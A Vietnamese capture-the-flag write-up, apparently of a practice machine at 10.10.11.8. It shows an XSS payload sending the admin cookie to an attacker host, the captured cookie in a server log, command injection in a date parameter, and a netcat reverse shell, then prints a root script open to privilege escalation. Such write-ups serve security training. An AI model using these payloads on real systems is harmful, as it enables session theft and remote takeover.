IP: 10.10.11.8
- Scan nmap: nmap -sV -T4 10.10.11.8
![image 1](image/1.png)
- Có 2 cổng mở cổng 22 cho ssh và cổng 5000 cho upnp?
- ở đây ta không biết username ssh là gì nên thử truy cập vào http://10.10.11.8:5000/
![image 2](image/2.png)
- Nhấp for questions 
![image 3](image/3.png)
- Ra 1 form nhập thông tin liên hệ, nhìn đề bài cho thông tin về lỗ hổng xss.
![image 4](image/4.png)
- chèn thử 1 đoạn script và form 
 ![image 5](image/5.png)
 ![image 9](image/9.png)
 - Tự động bật ra hộp thoại 1
 ![image 10](image/10.png)
- Dùng gobuster bruteforce thử xem còn trang nào khác không: 
```gobuster dir -u http://10.10.11.8:5000/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt```
![image 6](image/6.png)
- /dashboard truy cập được 
![image 7](image/7.png)
- Không có quyền truy cập.
- Khai thác lỗ hổng xss để  lấy cookie. 
- Đầu tiên ta tạo 1 server ở phía máy tấn công. 
```
python3 -m http.server 5000
```
![image 12](image/12.png)
```
<script>var i=new Image(); i.src="http://10.10.14.4:8001/?cookie="+btoa(document.cookie);</script>
```
- Máy tấn công sẽ có cookie, btoa là mã hóa base64 trên đường truyền.
```
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.10.14.4 - - [21/Aug/2024 16:30:27] "GET /?cookie= HTTP/1.1" 200 -
10.10.11.8 - - [21/Aug/2024 16:30:41] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
10.10.11.8 - - [21/Aug/2024 16:30:43] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -

```
decode ra 
![image 13](image/13.png)
- is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
![image 14](image/14.png)
- sửa cookie
![image 15](image/15.png)
- truy cập thành công
- Bật burp suite lên, bắt request 
![image 16](image/16.png)
- Thấy parameter là date, ta có thể phỏng đoán rằng lệnh này lấy dữ liệu từ máy chủ, chèn thử  ";id" vào
![image 17](image/17.png)
- Ta tạo 1 reverse shell bằng netcat, kết nối ngược lại với máy tấn công.
```
nc 10.10.14.4 1379 -e /bin/bash
```
- Trên máy tấn công: nc -nvlp 1379
![image 18](image/18.png)
- để tăng hiệu năng cho script nhập thêm lệnh: script /dev/null -c /bin/bash
![alt text](image.png)
![alt text](image-1.png)
```
cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0

```
![alt text](image-2.png)
![alt text](image-3.png)